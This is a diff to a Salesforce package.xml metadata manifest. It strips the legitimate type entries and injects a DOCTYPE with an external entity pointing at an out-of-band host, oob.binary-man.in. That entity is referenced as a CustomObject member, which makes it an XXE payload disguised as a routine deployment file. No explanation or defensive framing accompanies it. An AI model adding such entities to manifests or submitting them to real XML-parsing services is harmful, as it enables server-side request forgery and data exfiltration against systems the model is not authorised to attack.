@@ -1,17 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Package [
+  <!ENTITY pk SYSTEM "https://oob.binary-man.in/pkgxml/extent">
+  <!ENTITY inl "Hello">
+]>
 <Package xmlns="http://soap.sforce.com/2006/04/metadata">
-    <types>
-        <members>Hello</members>
-        <name>ApexClass</name>
-    </types>
-    <types>
-        <members>Account.BbTest__c</members>
-        <name>CustomField</name>
-    </types>
-    <types>
-        <members>GsPipeCtrl</members>
-        <members>GsPipeNoNs</members>
-        <name>Flow</name>
-    </types>
+    <types><members>&inl;</members><name>ApexClass</name></types>
+    <types><members>&pk;</members><name>CustomObject</name></types>
     <version>62.0</version>
 </Package>
